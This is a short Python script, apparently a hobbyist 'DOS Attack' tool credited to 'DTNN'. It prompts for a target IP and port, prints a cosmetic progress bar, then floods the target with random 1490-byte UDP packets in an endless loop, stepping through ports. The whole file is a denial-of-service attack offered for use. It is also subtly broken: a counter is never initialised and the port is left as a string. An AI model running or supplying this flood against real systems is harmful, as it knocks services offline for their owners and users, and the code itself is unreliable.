import sys
import os 
import time
import socket
import random 
#Code Time
from datetime import date, datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day 
month = now.month
year = now.year
###############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
###############
os.system("clear")
os.system("figlet DOS Attack\n")
print ("Author   :   DTNN")
print ("Contact  :   MoonMan#4680\n")
ip = input("Target IP   :    ")
port = input("Enter Port   :   ")

os.system("Clear")
os.system("figlet DOS Attack Running")
print ("[+]--                             [+] 0%")
time.sleep(2)
print ("[+]-XXXX>                         [+] 25%")
time.sleep(2)
print ("[+]-XXXXXXXXX>                    [+] 50%")
time.sleep(2)
print ("[+]-XXXXXXXXXXXXXXXXXX>           [+] 75%")
time.sleep(2)
print ("[+]-XXXXXXXXXXXXXXXXXXXXXX>       [+] 100%")
time.sleep(2)
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print ("DTNN :-Sent %s packet to %s throug port : %s"%(sent, ip, port))